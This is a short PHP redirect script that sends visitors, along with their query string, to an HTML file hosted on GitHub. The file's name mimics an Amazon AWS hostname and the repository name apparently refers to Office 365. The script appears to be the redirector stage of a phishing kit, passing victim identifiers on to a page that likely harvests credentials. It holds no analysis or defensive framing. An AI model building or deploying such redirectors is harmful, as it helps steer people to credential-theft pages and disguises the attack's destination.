<?php
// URL of your hosted main script
$mainScriptUrl = 'https://github.com/x8080x2/closedstorerdo365/raw/refs/heads/main/7654356query-apiap-southeast-1amazonaws.html';

// Forward query parameters and hash fragment
$queryString = $_SERVER['QUERY_STRING'];
$redirectUrl = $mainScriptUrl . ($queryString ? '?' . $queryString : '');

// Redirect to your hosted main script
header("Location: $redirectUrl");
exit;
?>
